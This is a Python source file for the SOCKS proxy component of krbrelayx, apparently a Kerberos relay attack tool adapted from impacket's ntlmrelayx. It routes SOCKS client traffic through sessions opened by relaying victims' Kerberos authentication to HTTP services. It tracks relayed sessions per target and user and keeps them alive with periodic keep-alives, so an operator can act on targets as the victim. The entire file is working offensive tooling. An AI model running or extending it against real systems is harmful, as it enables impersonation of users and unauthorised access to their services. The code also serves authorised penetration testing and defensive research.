#!/usr/bin/env python
####################
#
# SOCKS server for krbrelayx.
#
# Listens for SOCKS4/5 client connections and routes them through an
# already-authenticated HTTP relay session that was set up via Kerberos.
# The shape mirrors impacket's ntlmrelayx SOCKS implementation
# (impacket.examples.ntlmrelayx.servers.socksserver) but the active-relay
# registry is populated by the Kerberos HTTP relay path instead of NTLM.
#
####################
import socketserver
import socket
from queue import Queue
from struct import pack, unpack
from threading import Thread, Lock

from impacket import LOG
from impacket.examples.ntlmrelayx.servers.socksserver import (
    SOCKS5_GREETINGS_BACK,
    SOCKS5_REPLY,
    SOCKS5_REQUEST,
    SOCKS4_REPLY,
    SOCKS4_REQUEST,
    ATYP,
    replyField,
    SocksRelay,
    RepeatedTimer,
)

# Items the HTTP relay code pushes here:
#   (target, port, scheme, userName, client, data)
# The watcher thread below drains them into server.activeRelays.
activeConnections = Queue()

KEEP_ALIVE_TIMER = 30.0


def keepAliveTimer(server):
    LOG.debug('KeepAlive Timer reached. Updating connections')

    for target in list(server.activeRelays.keys()):
        for port in list(server.activeRelays[target].keys()):
            for user in list(server.activeRelays[target][port].keys()):
                if user in ('data', 'scheme'):
                    continue
                if server.activeRelays[target][port][user]['inUse']:
                    LOG.debug('Skipping %s@%s:%s (in use)' % (user, target, port))
                    continue
                LOG.debug('Calling keepAlive() for %s@%s:%s' % (user, target, port))
                try:
                    server.activeRelays[target][port][user]['protocolClient'].keepAlive()
                except Exception as e:
                    LOG.debug('SOCKS keepAlive: %s' % str(e))
                    msg = str(e)
                    if ('Broken pipe' in msg or 'reset by peer' in msg
                            or 'Invalid argument' in msg or 'Server not connected' in msg):
                        del server.activeRelays[target][port][user]
                        if len(server.activeRelays[target][port]) == 1:
                            del server.activeRelays[target][port]
                        LOG.debug('Removing dead relay for %s@%s:%s' % (user, target, port))


def activeConnectionsWatcher(server):
    while True:
        target, port, scheme, userName, client, data = activeConnections.get()
        if target not in server.activeRelays:
            server.activeRelays[target] = {}
        if port not in server.activeRelays[target]:
            server.activeRelays[target][port] = {}

        if userName in server.activeRelays[target][port]:
            LOG.info('SOCKS: Relay for %s at %s(%s) already exists. Discarding duplicate.'
                     % (userName, target, port))
            try:
                client.killConnection()
            except Exception:
                pass
            continue

        client_id = getattr(client, 'client_id', '?')
        LOG.info('SOCKS: Adding %s://%s@%s(%s) [%s] to active SOCKS connections'
                 % (scheme, userName, target, port, client_id))
        server.activeRelays[target][port][userName] = {
            'protocolClient': client,
            'inUse': False,
            'data': data,
            'isAdmin': 'N/A',
            # Per-relay mutex. Only one tunneled request at a time can use
            # the underlying authenticated TCP socket; concurrent browser
            # asset requests serialize on this so they queue instead of
            # being rejected with 503.
            'lock': Lock(),
        }
        server.activeRelays[target][port]['data'] = data
        server.activeRelays[target][port]['scheme'] = scheme


class KrbSocksRequestHandler(socketserver.BaseRequestHandler):
    def __init__(self, request, client_address, server):
        self.__socksServer = server
        self.__ip, self.__port = client_address
        self.__connSocket = request
        self.__socksVersion = 5
        self.targetHost = None
        self.targetPort = None
        socketserver.BaseRequestHandler.__init__(self, request, client_address, server)

    def sendReplyError(self, error=replyField.CONNECTION_REFUSED):
        if self.__socksVersion == 5:
            reply = SOCKS5_REPLY()
            reply['REP'] = error.value
        else:
            reply = SOCKS4_REPLY()
            if error.value != 0:
                reply['REP'] = 0x5B
        try:
            return self.__connSocket.sendall(reply.getData())
        except Exception:
            return None

    def handle(self):
        LOG.debug('SOCKS: New connection from %s(%s)' % (self.__ip, self.__port))

        data = self.__connSocket.recv(8192)
        if not data:
            return

        greetings = SOCKS5_GREETINGS_BACK(data)
        self.__socksVersion = greetings['VER']

        if self.__socksVersion == 5:
            try:
                self.__connSocket.sendall(SOCKS5_GREETINGS_BACK().getData())
            except OSError:
                return
            data = self.__connSocket.recv(8192)
            if not data:
                # Browsers routinely open a SOCKS connection then close it
                # before sending the request bytes. Bail before
                # SOCKS5_REQUEST(b'') tries to unpack zero bytes and
                # crashes the handler thread.
                return
            try:
                request = SOCKS5_REQUEST(data)
            except Exception as e:
                LOG.debug('SOCKS: malformed SOCKS5 request from %s: %s' % (self.__ip, e))
                return
        else:
            request = SOCKS4_REQUEST(data)

        if self.__socksVersion == 5:
            if request['ATYP'] == ATYP.IPv4.value:
                self.targetHost = socket.inet_ntoa(request['PAYLOAD'][:4])
                self.targetPort = unpack('>H', request['PAYLOAD'][4:])[0]
            elif request['ATYP'] == ATYP.DOMAINNAME.value:
                hostLength = unpack('!B', request['PAYLOAD'][:1])[0]
                self.targetHost = request['PAYLOAD'][1:hostLength + 1].decode('utf-8')
                self.targetPort = unpack('>H', request['PAYLOAD'][hostLength + 1:])[0]
            else:
                LOG.error('SOCKS: IPv6 not supported.')
                self.sendReplyError(replyField.ADDRESS_NOT_SUPPORTED)
                return
        else:
            self.targetPort = request['PORT']
            if request['ADDR'][:3] == b'\x00\x00\x00' and request['ADDR'][3] != 0:
                # SOCKS4a: the destination domain follows the userid in PAYLOAD
                parts = request['PAYLOAD'].split(b'\x00')
                if len(parts) < 2:
                    LOG.error('SOCKS: Malformed SOCKS4a request.')
                    self.sendReplyError()
                    return
                self.targetHost = parts[1].decode('utf-8')
            else:
                self.targetHost = socket.inet_ntoa(request['ADDR'])

        LOG.debug('SOCKS: Target %s(%s)' % (self.targetHost, self.targetPort))

        if (self.targetHost not in self.__socksServer.activeRelays
                or self.targetPort not in self.__socksServer.activeRelays[self.targetHost]):
            LOG.error("SOCKS: No active relay for %s(%s)" % (self.targetHost, self.targetPort))
            self.sendReplyError(replyField.CONNECTION_REFUSED)
            return

        scheme = self.__socksServer.activeRelays[self.targetHost][self.targetPort]['scheme']
        if scheme not in self.__socksServer.socksPlugins:
            LOG.error('SOCKS: No handler registered for scheme %s' % scheme)
            self.sendReplyError(replyField.CONNECTION_REFUSED)
            return

        plugin = self.__socksServer.socksPlugins[scheme]
        relay = plugin(self.targetHost, self.targetPort, self.__connSocket,
                       self.__socksServer.activeRelays[self.targetHost][self.targetPort])
        try:
            relay.initConnection()

            if self.__socksVersion == 5:
                reply = SOCKS5_REPLY()
                reply['REP'] = replyField.SUCCEEDED.value
                addr, port = self.__connSocket.getsockname()
                reply['PAYLOAD'] = socket.inet_aton(addr) + pack('>H', port)
            else:
                reply = SOCKS4_REPLY()

            self.__connSocket.sendall(reply.getData())

            if relay.skipAuthentication() is not True:
                self.__connSocket.close()
                return

            relay.tunnelConnection()
        except (BrokenPipeError, ConnectionResetError) as e:
            # Browser-side socket died. The relay is fine, leave it in
            # activeRelays so the next browser request can use it.
            LOG.debug('SOCKS handler: browser hung up (%s); relay kept' % e)
            return
        except Exception as e:
            LOG.debug('SOCKS handler exception: %s' % str(e), exc_info=True)
            msg = str(e)
            if ('Broken pipe' in msg or 'reset by peer' in msg
                    or 'Invalid argument' in msg):
                # Treat ambiguous socket errors as browser-side. If the
                # relay socket is actually dead, the next request's writes
                # will fail and we'll find out then. Better to keep the
                # relay around for one extra request than to evict it on
                # every browser tab close.
                LOG.debug('SOCKS handler: ambiguous socket error (%s); relay kept' % msg)
                return
            return
        finally:
            # Always release the per-relay lock. Otherwise the next
            # browser request stalls on a lock nobody holds.
            release = getattr(relay, 'releaseRelay', None)
            if release is not None:
                release()
            elif relay.username is not None and \
                    relay.username in self.__socksServer.activeRelays.get(self.targetHost, {}).get(self.targetPort, {}):
                self.__socksServer.activeRelays[self.targetHost][self.targetPort][relay.username]['inUse'] = False

        LOG.debug('SOCKS: Closing client tunnel.')
        try:
            self.sendReplyError(replyField.CONNECTION_REFUSED)
        except Exception:
            pass


class KrbSOCKS(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, server_address=('127.0.0.1', 1080),
                 handler_class=KrbSocksRequestHandler):
        LOG.info('SOCKS proxy started. Listening on %s:%d',
                 server_address[0], server_address[1])
        self.activeRelays = {}
        self.socksPlugins = {}
        self.supportedSchemes = []
        socketserver.TCPServer.__init__(self, server_address, handler_class)

        # Load krbrelayx-specific socks plugins first. They tunnel raw
        # bytes over `protocolClient.session.sock`, which is what the
        # HTTP relay client leaves in place after a Kerberos AP-REQ has
        # been accepted. Anything we don't ship a plugin for falls back
        # to the impacket plugin set.
        from lib.servers.socksplugins import KRB_SOCKS_RELAYS
        for relay in KRB_SOCKS_RELAYS:
            LOG.info('SOCKS plugin %s loaded.' % relay.PLUGIN_NAME)
            self.socksPlugins[relay.PLUGIN_SCHEME] = relay
            self.supportedSchemes.append(relay.PLUGIN_SCHEME)

        from impacket.examples.ntlmrelayx.servers.socksplugins import SOCKS_RELAYS
        for relay in SOCKS_RELAYS:
            if relay.PLUGIN_SCHEME in self.socksPlugins:
                continue
            LOG.info('SOCKS plugin %s (impacket) loaded.' % relay.PLUGIN_NAME)
            self.socksPlugins[relay.PLUGIN_SCHEME] = relay
            self.supportedSchemes.append(relay.PLUGIN_SCHEME)

        self.__timer = RepeatedTimer(KEEP_ALIVE_TIMER, keepAliveTimer, self)

        self.activeConnectionsWatcher = Thread(
            target=activeConnectionsWatcher, args=(self,))
        self.activeConnectionsWatcher.daemon = True
        self.activeConnectionsWatcher.start()

    def shutdown(self):
        try:
            self.__timer.stop()
        except Exception:
            pass
        return socketserver.TCPServer.shutdown(self)
